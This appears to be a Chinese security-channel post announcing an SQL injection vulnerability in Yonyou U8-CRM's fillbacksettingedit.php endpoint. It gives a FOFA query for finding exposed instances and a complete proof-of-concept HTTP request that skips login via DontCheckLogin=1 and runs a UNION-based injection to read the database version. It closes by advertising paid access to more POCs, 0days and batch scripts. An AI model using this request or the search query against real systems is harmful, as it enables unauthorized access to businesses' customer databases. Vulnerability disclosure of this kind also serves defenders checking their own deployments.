#  漏洞推送|用友U8CRM_fillbacksettingedit_存在SQL注入漏洞   
 小白菜安全   2024-10-09 16:59  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
用友U8-CRM是企业利用信息技术，是一项商业策略，它通过依据市场细分组织企业资源、培养以客户为中心的经营行为、执行以客户为中心的业务流程等手段来优化企业的客户满意度和获利能力。用友U8-CRM   
fillbacksettingedit  
存在SQL注入漏洞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
FOFA:  
 title="用友U8CRM"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2JzIBRIIqTe3gsZFEl2a8WeAOKrlPskU2WAnHicdn0eDSib9aKTA6s0jnOlO3be8mTYnibnyLWN7vwA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
联合注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2JzIBRIIqTe3gsZFEl2a8WuTmwiaOObOLC9ulmU1yjCtnHuU1esadFiaQtrh6cuxv7YXIiaCaztt6UQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=-1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Cookie: PHPSESSID=bgsesstimeout-;
```  
  
  
---------------------------------------------------  
  
更多漏洞poc（包括0day漏洞）、安全工具、批量脚本加入内部圈子获取，回复“优惠卷”，福利限时发放。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
